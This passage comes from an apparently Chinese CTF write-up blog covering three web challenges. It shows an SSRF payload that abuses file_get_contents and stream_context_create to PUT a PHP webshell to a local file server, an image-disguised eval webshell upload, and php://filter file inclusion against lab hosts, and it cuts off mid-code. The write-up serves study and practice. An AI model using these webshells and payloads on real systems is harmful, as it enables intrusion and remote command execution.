class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p style=&quot;color: red;&quot;&gt;只允许输入数字和字母&lt;/p&gt;&#x27;</span>;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">var</span> jsonData = JSON.<span class="hljs-title function_ invoke__">parse</span>(data.result);<br>                        <br>                        <span class="hljs-keyword">if</span> (jsonData.paths &amp;&amp; jsonData.paths.length &gt; <span class="hljs-number">0</span>) &#123;<br>                            <span class="hljs-keyword">var</span> resultHtml = <span class="hljs-string">&#x27;&lt;table style=&quot;width:100%; border-collapse: collapse;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;thead&gt;&lt;tr style=&quot;background-color: #f2f2f2;&quot;&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;名称&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;修改时间&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;大小&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;th style=&quot;text-align: left; padding: 8px; border: 1px solid #ddd;&quot;&gt;操作&lt;/th&gt;&#x27;</span>;<br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;<br>                            <br>                            jsonData.paths.<span class="hljs-title function_ invoke__">forEach</span>(function(item) &#123;<br>                                <span class="hljs-keyword">var</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(item.mtime);<br>                                <span class="hljs-keyword">var</span> formattedDate = date.<span class="hljs-title function_ invoke__">toLocaleString</span>();<br>                                <span class="hljs-keyword">var</span> fileSize = <span class="hljs-title function_ invoke__">formatFileSize</span>(item.size);<br>                                <br>                                resultHtml += <span class="hljs-string">&#x27;&lt;tr style=&quot;border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + item.name + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + formattedDate + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span> + fileSize + <span class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;td style=&quot;padding: 8px; border: 1px solid #ddd;&quot;&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;button onclick=&quot;viewFile(\&#x27;&#x27;</span> + item.name + <span class="hljs-string">&#x27;\&#x27;)&quot; style=&quot;margin-right: 5px;&quot;&gt;查看&lt;/button&gt;&#x27;</span>;<br>                                resultHtml += <span class="hljs-string">&#x27;&lt;/td&gt;&lt;/tr&gt;&#x27;</span>;<br>                            &#125;);<br>                            <br>                            resultHtml += <span class="hljs-string">&#x27;&lt;/tbody&gt;&lt;/table&gt;&#x27;</span>;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = resultHtml;<br>                        &#125; <span class="hljs-keyword">else</span> &#123;<br>                            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;没有找到匹配的图片&lt;/p&gt;&#x27;</span>;<br>                        &#125;<br>                    &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;解析结果时出错&lt;/p&gt;&#x27;</span>;<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;错误: &#x27;</span> + data.message + <span class="hljs-string">&#x27;&lt;/p&gt;&#x27;</span>;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;searchResultContent&#x27;</span>).innerHTML = <span class="hljs-string">&#x27;&lt;p&gt;搜索过程中发生错误&lt;/p&gt;&#x27;</span>;<br>            &#125;);<br>        &#125;);<br>        <br>        document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">&#x27;submit&#x27;</span>, function(e) &#123;<br>            e.<span class="hljs-title function_ invoke__">preventDefault</span>();<br>            <br>            <span class="hljs-keyword">var</span> formData = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FormData</span>(this);<br>            <br>            <span class="hljs-title function_ invoke__">fetch</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>, &#123;<br>                <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>                <span class="hljs-attr">body</span>: formData<br>            &#125;)<br>            .<span class="hljs-title function_ invoke__">then</span>(response =&gt; response.<span class="hljs-title function_ invoke__">json</span>())<br>            .<span class="hljs-title function_ invoke__">then</span>(data =&gt; &#123;<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                <br>                <span class="hljs-keyword">if</span> (data.success) &#123;<br>                    <span class="hljs-keyword">var</span> fileContentDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>);<br>                    fileContentDiv.textContent = <span class="hljs-string">&#x27;&#x27;</span>; <br><br>                    <span class="hljs-keyword">var</span> img = document.<span class="hljs-title function_ invoke__">createElement</span>(<span class="hljs-string">&#x27;img&#x27;</span>);<br>                    img.src = data.base64_data;<br>                    img.style.maxWidth = <span class="hljs-string">&#x27;100%&#x27;</span>;<br>                    img.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                    img.style.margin = <span class="hljs-string">&#x27;0 auto&#x27;</span>;<br>                    fileContentDiv.<span class="hljs-title function_ invoke__">appendChild</span>(img);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;错误: &#x27;</span> + data.message;<br>                &#125;<br>            &#125;)<br>            .<span class="hljs-keyword">catch</span>(error =&gt; &#123;<br>                console.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;错误:&#x27;</span>, error);<br>                <span class="hljs-keyword">var</span> resultDiv = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewResult&#x27;</span>);<br>                resultDiv.style.display = <span class="hljs-string">&#x27;block&#x27;</span>;<br>                document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;fileContent&#x27;</span>).textContent = <span class="hljs-string">&#x27;获取图片时发生错误&#x27;</span>;<br>            &#125;);<br>        &#125;);<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">formatFileSize</span>(<span class="hljs-params">bytes</span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (bytes === <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0 B&#x27;</span>;<br>            <br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">k</span> = <span class="hljs-number">1024</span>;<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sizes</span> = [<span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;KB&#x27;</span>, <span class="hljs-string">&#x27;MB&#x27;</span>, <span class="hljs-string">&#x27;GB&#x27;</span>, <span class="hljs-string">&#x27;TB&#x27;</span>];<br>            <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">i</span> = Math.<span class="hljs-title function_ invoke__">floor</span>(Math.<span class="hljs-title function_ invoke__">log</span>(bytes) / Math.<span class="hljs-title function_ invoke__">log</span>(k));<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">parseFloat</span>((bytes / Math.<span class="hljs-title function_ invoke__">pow</span>(k, i)).<span class="hljs-title function_ invoke__">toFixed</span>(<span class="hljs-number">2</span>)) + <span class="hljs-string">&#x27; &#x27;</span> + sizes[i];<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">viewFile</span>(<span class="hljs-params">filename</span>) </span>&#123;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;filename&#x27;</span>).value = filename;<br>            document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&#x27;viewForm&#x27;</span>).<span class="hljs-title function_ invoke__">dispatchEvent</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Event</span>(<span class="hljs-string">&#x27;submit&#x27;</span>));<br>        &#125;<br>    &lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>当时得到源码后不会做了  </p><p>赛后看官方解法：</p><p>ssrf</p><p>index.php在查看图片时使用file_get_contents获取任意文件并且以data:image&#x2F;jpeg;base64的形式返回，通过这种方式可以尝试读源码 源码中预留了带有dufs的变量名以及上传和搜索的流量特征都可以给选手推测的机会，选手如果运气好遍历到文件甚至可以直接下载到dufs的Linux二进制文件自行进行测试 同时，源码的file_get_contents还预留了options变量，这意味着可以通过此函数进行PUT请求上传任意文件，从而绕过php脚本的限制上传php木马getshell，之后从环境变量获取flag即可</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$file_content = <span class="hljs-symbol">@file_get_contents</span>($filename, <span class="hljs-literal">false</span>, <span class="hljs-symbol">@stream_context_create</span>($_POST[<span class="hljs-string">&#x27;options&#x27;</span>]))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>攻击payload</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /index.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">83</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4103</span>.<span class="hljs-number">116</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">9</span><br><br><span class="hljs-attribute">action</span>=view&amp;filename=http://<span class="hljs-number">127.0.0.1:5000</span>/i.php&amp;options[http][method]=PUT&amp;options[http][content]=%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp+echo+getenv%<span class="hljs-number">28</span>%<span class="hljs-number">27</span>FLAG%<span class="hljs-number">27</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E<br></code></pre></td></tr></table></figure><p>传入部分url解码内容：<br><?php echo getenv('FLAG');?>   </p><p>原 http 请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:50688<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>245<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryEFvaPBTZNbCkhtbn<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:50688/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;action&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">view</span></span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;filename&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql"><span class="hljs-keyword">index</span>.php</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryEFvaPBTZNbCkhtbn--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure><p>关键利用代码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_content</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-literal">false</span>, @<span class="hljs-title function_ invoke__">stream_context_create</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;options&#x27;</span>]));<br></code></pre></td></tr></table></figure><p>这段代码会让stream_context_create函数接收post上来的option参数</p><p>关键来理解一下这份payload：  </p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">action=view&amp;filename=http://127.0.0.1:5000/shell.php&amp;options[http][method]=PUT&amp;options[http][content]=</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>利用view操作来绕过upload操作的waf<br>源码的查看图片利用的是 file_get_contents() 支持http协议，用它来触发ssrf来向dufs(文件服务器来上传文件，而通过index.php的源码可以知道dufs文件服务运行在本地5000端口上)目录直接上传文件  </p><h2 id="options-http-method-PUT"><a href="#options-http-method-PUT" class="headerlink" title="options[http][method]&#x3D;PUT"></a><strong>options[http][method]&#x3D;PUT</strong></h2><p>用途：通过 PHP 的 stream_context_create 函数自定义 HTTP 请求的上下文（Context）。</p><p>攻击逻辑：</p><p>[method]&#x3D;PUT：将 HTTP 请求方法从默认的 GET 改为 PUT。</p><p>PUT 方法的作用：向服务器上传文件（需目标服务支持，如 dufs 允许 PUT 上传文件）。</p><p>为什么重要：通过此参数绕过常规文件上传限制，直接写入文件。<br>通过 PHP 的 stream_context_create 函数自定义 HTTP 请求的上下文（Context）将原来请求的GET改为PUT以向dufs服务上传木马  </p><h2 id="options-http-content-php-system-GET-‘a’"><a href="#options-http-content-php-system-GET-‘a’" class="headerlink" title="options[http][content]&#x3D;&lt; ?php system($_GET[‘a’]);? &gt;"></a>options[http][content]&#x3D;&lt; ?php system($_GET[‘a’]);? &gt;</h2><p>用途：设置 HTTP 请求的 Body 内容（即上传的文件内容）。</p><p>攻击逻辑：</p><?php system($_GET['a']);?><p>：一个简短的 PHP Webshell。</p><p>system()：执行系统命令。</p><p>$_GET[‘a’]：从 URL 参数 a 中接收用户输入的命令。</p><p>例如：访问 <a href="http://127.0.0.1:5000/shell.php?a=ls">http://127.0.0.1:5000/shell.php?a=ls</a> 会执行 ls 命令。</p><p>关键作用：将恶意代码写入服务器的 shell.php 文件，为后续攻击做准备。</p><h2 id="完整攻击流程"><a href="#完整攻击流程" class="headerlink" title="完整攻击流程"></a>完整攻击流程</h2><p>1.触发 SSRF   </p><p>服务器执行 file_get_contents 时，尝试读取 <a href="http://127.0.0.1:5000/shell.php">http://127.0.0.1:5000/shell.php</a><br>但实际发起的是一个 PUT 请求。</p><p>2.上传 Webshell</p><p>请求内容为：<br>此时用stream_context_create构建的http请求应该就是如下了：  </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/shell.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:5000<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><br><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>PUT请求将会将shell.php和其指定内容写入dufs  </p><p>如果 dufs 允许 PUT 上传，shell.php 会被写入服务器。</p><p>所以第一个option用来定义put的http请求，第二个option用来定义http主体</p><p>接下来就是蚂蚁连马然后再环境变量里看到flag</p><h2 id="stream-context-create"><a href="#stream-context-create" class="headerlink" title="stream_context_create"></a>stream_context_create</h2><p>stream_context_create 是 PHP 中用于创建流上下文（stream context）的函数，它允许开发者在执行文件、网络或其他流操作时，自定义底层协议的行为（例如设置 HTTP 请求头、修改 FTP 传输模式等）。这个函数在实现复杂网络操作时非常有用，但如果使用不当，也可能引发安全漏洞（如 SSRF、文件上传绕过等）。</p><p>数的基本语法:</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">stream_context_create(array $options = ?,<span class="hljs-built_in"> array </span>$params = ?): resource<br></code></pre></td></tr></table></figure><p>参数：</p><p>$options：一个多维数组，用于配置不同协议（如 http、ftp、ssl 等）的行为。</p><p>$params（可选）：设置上下文参数（如超时时间）。</p><p>返回值：返回一个流上下文资源，可传递给其他流操作函数（如 file_get_contents、fopen）。</p><h1 id="SWPUCTF-2021-新生赛-easyupload3-0"><a href="#SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="[SWPUCTF 2021 新生赛]easyupload3.0"></a>[SWPUCTF 2021 新生赛]easyupload3.0</h1><p>传正常图片，得到路径<br>然后试试直接传码，不行<br>修改请求头： </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>354<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryrWwjxZ6YBiFAz2Lm<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node4.anna.nssctf.cn:28055/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>Hm_lvt_648a44a949074de73151ffaa0a832aec=1748528050; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1748528050; HMACCOUNT=1B73E9281BD50EC7; PHPSESSID=fve350i8dhj45k2ls9htd4l6r5<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;shell.png&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/png</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">这不传一个🐎？</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryrWwjxZ6YBiFAz2Lm--</span></span><br></code></pre></td></tr></table></figure><p>然后传.htaccess</p><p>蚂蚁直接连<br>env查看环境的到flag</p><h1 id="鹏城杯-2022-简单包含"><a href="#鹏城杯-2022-简单包含" class="headerlink" title="[鹏城杯 2022]简单包含"></a>[鹏城杯 2022]简单包含</h1><p>上来能看到给出的源码：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br><span class="hljs-comment">//flag in /var/www/html/flag.php;</span><br></code></pre></td></tr></table></figure><p>直接传入flag&#x3D;flag.php<br>提示有waf<br>使用php伪协议结果一样<br>尝试读取index.php完整源码<br>flag&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;index.php  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>)) &lt; <span class="hljs-number">800</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/&#x27;</span>, <span class="hljs-variable">$path</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nssctf waf!&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$path</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;code&gt;&lt;span style=<span class="hljs-string">&quot;color: #000000&quot;</span>&gt;<br>&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;&amp;lt;?php&amp;nbsp;&lt;br /&gt;highlight_file&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-keyword">__FILE__</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;);&lt;br /&gt;<span class="hljs-keyword">include</span>(&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #0000BB&quot;</span>&gt;<span class="hljs-variable">$_POST</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;[&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #DD0000&quot;</span>&gt;<span class="hljs-string">&quot;flag&quot;</span>&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: #007700&quot;</span>&gt;]);&lt;br /&gt;&lt;/span&gt;&lt;span style=<span class="hljs-string">&quot;color: 